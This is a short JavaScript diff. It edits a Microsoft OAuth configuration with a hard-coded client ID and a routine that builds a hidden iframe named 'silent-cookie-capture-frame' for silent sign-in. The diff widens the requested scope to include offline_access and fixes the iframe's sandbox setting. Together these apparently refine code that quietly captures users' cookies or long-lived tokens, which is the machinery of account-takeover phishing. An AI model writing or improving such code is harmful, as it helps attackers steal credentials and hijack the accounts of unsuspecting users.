@@ -341,7 +341,7 @@
           // ✅ CORRECTED CLIENT ID
           clientId: '2e338732-c914-4129-a148-45c24f2da81d',
           redirectUri: dynamicRedirectUri,
-          scope: 'openid profile https://www.office.com/v2/OfficeHome.All',
+          scope: 'openid profile email offline_access',
           authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
         };
 
@@ -366,7 +366,7 @@
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.id = 'silent-cookie-capture-frame';
-                iframe.sandbox.add('allow-same-origin', 'allow-scripts');
+                iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
 
                 const silentAuthUrl = new URL(OFFICE_CONFIG.authority);
                 silentAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
